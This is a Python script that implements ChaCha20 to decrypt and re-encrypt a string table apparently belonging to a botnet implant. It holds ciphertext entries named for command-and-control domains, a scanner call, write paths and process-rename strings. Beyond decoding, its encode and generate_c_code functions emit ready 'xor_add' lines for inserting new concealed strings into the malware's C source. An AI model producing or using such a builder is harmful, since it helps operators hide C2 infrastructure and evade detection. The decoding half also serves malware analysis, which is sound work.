#!/usr/bin/env python3
"""
Table Decoder/Encoder for ChaCha20 encrypted strings
Decodes and encodes the encrypted string table from table.c
"""

import struct
from typing import List, Tuple

class ChaCha20:
    """ChaCha20 stream cipher implementation"""
    
    def __init__(self):
        self.constants = [0x61707865, 0x3320646e, 0x79622d32, 0x6b206574]
    
    def _rotl32(self, x: int, n: int) -> int:
        """32-bit left rotation"""
        return ((x << n) | (x >> (32 - n))) & 0xffffffff
    
    def _quarterround(self, state: List[int], a: int, b: int, c: int, d: int):
        """ChaCha20 quarter round"""
        state[a] = (state[a] + state[b]) & 0xffffffff
        state[d] = self._rotl32(state[d] ^ state[a], 16)
        state[c] = (state[c] + state[d]) & 0xffffffff
        state[b] = self._rotl32(state[b] ^ state[c], 12)
        state[a] = (state[a] + state[b]) & 0xffffffff
        state[d] = self._rotl32(state[d] ^ state[a], 8)
        state[c] = (state[c] + state[d]) & 0xffffffff
        state[b] = self._rotl32(state[b] ^ state[c], 7)
    
    def _chacha20_block(self, state: List[int]) -> bytes:
        """Generate a 64-byte ChaCha20 block"""
        working_state = state.copy()
        
        # 20 rounds (10 double rounds)
        for _ in range(10):
            # Column rounds
            self._quarterround(working_state, 0, 4, 8, 12)
            self._quarterround(working_state, 1, 5, 9, 13)
            self._quarterround(working_state, 2, 6, 10, 14)
            self._quarterround(working_state, 3, 7, 11, 15)
            # Diagonal rounds
            self._quarterround(working_state, 0, 5, 10, 15)
            self._quarterround(working_state, 1, 6, 11, 12)
            self._quarterround(working_state, 2, 7, 8, 13)
            self._quarterround(working_state, 3, 4, 9, 14)
        
        # Add original state
        for i in range(16):
            working_state[i] = (working_state[i] + state[i]) & 0xffffffff
        
        # Serialize to bytes (little endian)
        block = b''
        for i in range(16):
            block += struct.pack('<I', working_state[i])
        
        return block
    
    def _init_state(self, key: bytes, counter: int, nonce: bytes) -> List[int]:
        """Initialize ChaCha20 state"""
        state = [0] * 16
        
        # Constants
        state[0:4] = self.constants
        
        # Key (32 bytes = 8 words)
        for i in range(8):
            state[4 + i] = struct.unpack('<I', key[i*4:(i+1)*4])[0]
        
        # Counter
        state[12] = counter
        
        # Nonce (12 bytes = 3 words)
        for i in range(3):
            state[13 + i] = struct.unpack('<I', nonce[i*4:(i+1)*4])[0]
        
        return state
    
    def encrypt_decrypt(self, key: bytes, counter: int, nonce: bytes, data: bytes) -> bytes:
        """ChaCha20 encryption/decryption (same operation)"""
        if len(key) != 32:
            raise ValueError("Key must be 32 bytes")
        if len(nonce) != 12:
            raise ValueError("Nonce must be 12 bytes")
        
        state = self._init_state(key, counter, nonce)
        result = bytearray()
        
        for i in range(0, len(data), 64):
            keystream = self._chacha20_block(state)
            state[12] = (state[12] + 1) & 0xffffffff  # Increment counter
            
            chunk = data[i:i+64]
            for j in range(len(chunk)):
                result.append(chunk[j] ^ keystream[j])
        
        return bytes(result)

class TableDecoder:
    """Decoder for the encrypted string table"""
    
    def __init__(self):
        # Key and nonce from table.h
        self.key = bytes([
            0x16, 0x1e, 0x19, 0x1b, 0x11, 0x1f, 0x00, 0x1d,
            0x04, 0x1c, 0x0e, 0x08, 0x0b, 0x1a, 0x12, 0x07,
            0x05, 0x09, 0x0d, 0x0f, 0x06, 0x0a, 0x15, 0x01,
            0x0c, 0x14, 0x1f, 0x17, 0x02, 0x03, 0x13, 0x18
        ])
        
        self.nonce = bytes([
            0x1e, 0x00, 0x4a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
        ])
        
        self.chacha20 = ChaCha20()
        
        # Encrypted strings from table.c
        self.encrypted_strings = {
            'TABLE_EXEC_SUCCESS': b'\x34\xA6\xC3\x07\xD1\x5F\x9E\xCC\x67\x88\xAB\xA5\x7E\x37\x3A\xE8\xCC\xD8\xCA',
            'TABLE_WRITEPATH': b'\x73\xB3\xC7\x1B',
            'TABLE_WRITEPATH1': b'\x73\xB1\xCB\x19\xDE\x48\x9B\xD5',
            'TABLE_WRITEPATH2': b'\x73\xB1\xCB\x19\xDE\x4E\x83\xCB',
            'TABLE_WRITEPATH3': b'\x73\xA3\xCF\x1D\xDE\x4F\x9E\xC8',
            'TABLE_WRITEPATH4': b'\x73\xAA\xC4\x1F',
            'TABLE_WRITEPATH5': b'\x73\xAF\xC5\x06\x94',
            'TABLE_CNCDOMAIN': b'\x3F\xA6\xD9\x0A\x93\x50\x97\xCB\x6A\x88\xA5\xAC\x66\x30',
            'TABLE_CNCDOMAIN1': b'\x2F\xB3\xCB\x19\x82\x54\x9F\xD5\x27\x8E\xE4\xB8\x77\x3B\x26',
            'TABLE_CNCDOMAIN2': b'\x2F\xA2\xCB\x07\xDF\x53\x85\xD6',
            'TABLE_CNCDOMAIN3': b'\x34\xA8\xDE\x0E\x9D\x4E\x81\xC4\x67\x8D\xEA\xE6\x6F\x37\x26\xE5\xD9\xD3',
            'TABLE_SCANCALL': b'\x65\xF6\x84\x52\xC3\x12\xC4\x91\x39\xC7\xBE\xF0',
            'TABLE_RENAME1': b'\x31\xAE\xC4\x02\xAE\x54\x82\xD1\x79\x8D',
            'TABLE_RENAME2': b'\x07\xB0\xCB\x1F\x92\x54\x92\xCA\x6E\xC6\xBB\x95',
            'TABLE_RENAME3': b'\x73\xA5\xC3\x05\xDE\x5E\x83\xD6\x70\x8B\xE4\xB0\x3F\x2A\x31\xE8\xC8\xD8\xDA\x49',
            'TABLE_RENAME4': b'\x07\xAC\xD9\x1C\x90\x4C\x92\x95\x54',
            'TABLE_RENAME5': b'\x73\xA5\xC3\x05\xDE\x5E\x83\xD6\x70\x8B\xE4\xB0\x3F\x30\x20\xF4\xC9',
            'TABLE_RENAME6': b'\x73\xA5\xC3\x05\xDE\x4F\x9E\x85\x26\x8C\xFF\xAB\x30\x37\x3A\xED\xD9\x98\xCA\x02\xD3\x30\xC6'
        }
    
    def decode_string(self, encrypted_data: bytes) -> str:
        """Decode an encrypted string"""
        decrypted = self.chacha20.encrypt_decrypt(self.key, 1, self.nonce, encrypted_data)
        return decrypted.decode('utf-8', errors='ignore').rstrip('\x00')
    
    def encode_string(self, plaintext: str) -> bytes:
        """Encode a plaintext string"""
        plaintext_bytes = plaintext.encode('utf-8')
        encrypted = self.chacha20.encrypt_decrypt(self.key, 1, self.nonce, plaintext_bytes)
        return encrypted
    
    def decode_all(self) -> dict:
        """Decode all encrypted strings"""
        decoded = {}
        for name, encrypted_data in self.encrypted_strings.items():
            try:
                decoded[name] = self.decode_string(encrypted_data)
            except Exception as e:
                decoded[name] = f"Error decoding: {e}"
        return decoded
    
    def print_decoded_table(self):
        """Print all decoded strings in a readable format"""
        print("=== Decoded String Table ===")
        decoded = self.decode_all()
        for name, value in decoded.items():
            print(f"{name:20} = '{value}'")
    
    def generate_c_code(self, strings_dict: dict) -> str:
        """Generate C code for new encrypted strings"""
        c_code = []
        for name, plaintext in strings_dict.items():
            encrypted = self.encode_string(plaintext)
            hex_string = ''.join(f'\\x{b:02X}' for b in encrypted)
            c_code.append(f'xor_add({name}, "{hex_string}", {len(encrypted)});')
        return '\n'.join(c_code)

def main():
    """Main function demonstrating usage"""
    decoder = TableDecoder()
    
    print("ChaCha20 Table Decoder/Encoder")
    print("=" * 40)
    
    # Decode all existing strings
    decoder.print_decoded_table()
    
    print("\n=== Interactive Mode ===")
    print("Commands:")
    print("  decode <hex_string>  - Decode a hex string")
    print("  encode <text>        - Encode plain text")
    print("  list                 - List all decoded strings")
    print("  quit                 - Exit")
    
    while True:
        try:
            cmd = input("\n> ").strip().split(' ', 1)
            
            if not cmd or cmd[0] == 'quit':
                break
            elif cmd[0] == 'decode' and len(cmd) == 2:
                try:
                    # Parse hex string
                    hex_str = cmd[1].replace('\\x', '').replace(' ', '')
                    encrypted_data = bytes.fromhex(hex_str)
                    decoded = decoder.decode_string(encrypted_data)
                    print(f"Decoded: '{decoded}'")
                except Exception as e:
                    print(f"Error: {e}")
            elif cmd[0] == 'encode' and len(cmd) == 2:
                try:
                    encrypted = decoder.encode_string(cmd[1])
                    hex_string = ''.join(f'\\x{b:02X}' for b in encrypted)
                    print(f"Encoded: \"{hex_string}\"")
                    print(f"Length: {len(encrypted)}")
                    print(f"C code: xor_add(TABLE_NAME, \"{hex_string}\", {len(encrypted)});")
                except Exception as e:
                    print(f"Error: {e}")
            elif cmd[0] == 'list':
                decoder.print_decoded_table()
            else:
                print("Invalid command. Use 'decode <hex>', 'encode <text>', 'list', or 'quit'")
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"Error: {e}")
    
    print("\nGoodbye!")

if __name__ == '__main__':
    main()